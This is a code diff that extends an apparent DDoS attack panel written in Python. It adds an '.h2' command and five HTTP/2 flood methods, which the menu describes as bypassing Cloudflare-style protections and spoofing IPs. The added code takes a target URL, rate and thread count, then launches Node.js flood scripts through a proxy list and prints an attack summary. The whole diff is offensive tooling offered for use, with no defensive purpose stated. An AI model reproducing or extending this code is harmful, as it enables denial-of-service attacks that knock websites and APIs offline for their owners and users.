@@ -1290,6 +1290,10 @@ def main():
    
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .l7 <method> <url> <threads> <duration> [port]              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run LAYER7 attack         
 
+{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("H2 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
+
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .h2 <method> <url> <time> <rate> <threads>                  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run HTTP/2 attack
+
 {Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("GAME METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .game <method> <ip>[:port] <threads> <duration> [port]      {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run GAME attack 
@@ -1321,6 +1325,14 @@ def main():
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dgb         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods with anti-DDoS bypass headers to target specific protections.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}http-storm  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Multi-method HTTP flood (GET/HEAD/OPTIONS) to overwhelm web servers.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}api-killer  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets API endpoints with JSON payloads to overload backend processing.                                               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+
+{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("H2 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
+
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}h2-bypass   {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP/2 flood with randomized headers to bypass protections like Cloudflare.                                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}h2-blast    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   High-intensity HTTP/2 flood to overwhelm server resources.                                                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}h2-hold     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP/2 flood with memory management to sustain long attacks.                                                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}h2-godly    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Advanced HTTP/2 flood with optimized performance for maximum impact.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}starxbypass {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP/2 flood with extensive header randomization and IP spoofing to bypass defenses.                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("GAME METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
@@ -1430,6 +1442,71 @@ def main():
                 Launch(method, link, threads, duration, proxy_type, port)
             except (ValueError, IndexError):
                 print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .discord <link> <threads> <duration> [port]"))
+
+        elif command.startswith(".h2"):
+            try:
+                args = command.split()
+                if len(args) != 6:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .h2 <method> <url> <time> <rate> <threads>"))
+                    continue
+                method = args[1].lower()
+                url = args[2]
+                time_duration = int(args[3])
+                rate = int(args[4])
+                threads = int(args[5])
+                proxy_file = "proxies.txt"  # Hardcoded proxy file
+
+                # Validate the method
+                valid_h2_methods = ["h2-bypass", "h2-blast", "h2-hold", "h2-godly", "starxbypass"]
+                if method not in valid_h2_methods:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid H2 method. Use 'methods' to list available options."))
+                    continue
+
+                if time_duration < 1 or rate < 1 or threads < 1:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Time, rate, and threads must be positive integers."))
+                    continue
+
+                # Map the method to the corresponding JavaScript file
+                js_file = method + ".js" if method in ["h2-bypass", "h2-blast", "h2-hold", "h2-godly"] else "StarsXBypass.js"
+
+                # Display attack summary (similar to the Launch function)
+                clearcs()
+                print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "             ╦  ╦ ╦╔╗╔╔═╗╦═╗")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "             ║  ║ ║║║║╠═╣╠╦╝")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "             ╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭")}
+{white}  ⏾⋆.˚ 𝓐𝓽𝓽𝓪𝓬𝓴 𝔀𝓪𝓼 𝓼𝓮𝓷𝓽 𝓼𝓾𝓬𝓬𝓮𝓼𝓼𝓯𝓾𝓵𝓵𝔂! ⏾⋆.˚
+{Colorate.Horizontal(Colors.cyan_to_blue, "┌───────────────────────────────────────────┐")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴀᴛᴛᴀᴄᴋ ꜱᴜᴍᴍᴀʀʏ
+{Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "🎯  ➤")}  {url.ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴍᴏᴅᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⚙️     ➤")}  {method.ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛɪᴍᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⌛    ➤")}  {str(time_duration).ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ʀᴀᴛᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⚡    ➤")}  {str(rate).ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛʜʀᴇᴀᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "⚔   ➤")}  {str(threads).ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴘʀᴏxʏ ꜰ {Colorate.Horizontal(Colors.cyan_to_blue, "☣  ➤")}  {proxy_file.ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ɢɪᴛʜᴜʙ     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://github.com/Sakuzuna/
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://check-host.net/check-http?host={url}
+{Colorate.Horizontal(Colors.cyan_to_blue, "└───────────────────────────────────────────┘")}""")
+
+                # Run the attack using subprocess
+                try:
+                    subprocess.run([
+                        "node",
+                        js_file,
+                        url,
+                        str(time_duration),
+                        str(rate),
+                        str(threads),
+                        proxy_file
+                    ], check=True)
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Attack {method.upper()} finished."))
+                except subprocess.CalledProcessError:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Failed to execute {js_file}. Ensure Node.js is installed and the script exists."))
+                except FileNotFoundError:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> {js_file} not found in the current directory."))
+            except (ValueError, IndexError):
+                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .h2 <method> <url> <time> <rate> <threads>"))
 
         else:
             print(Colorate.Horizontal(Colors.cyan_to_blue, "> Unknown command. Type 'help' for a list of commands."))
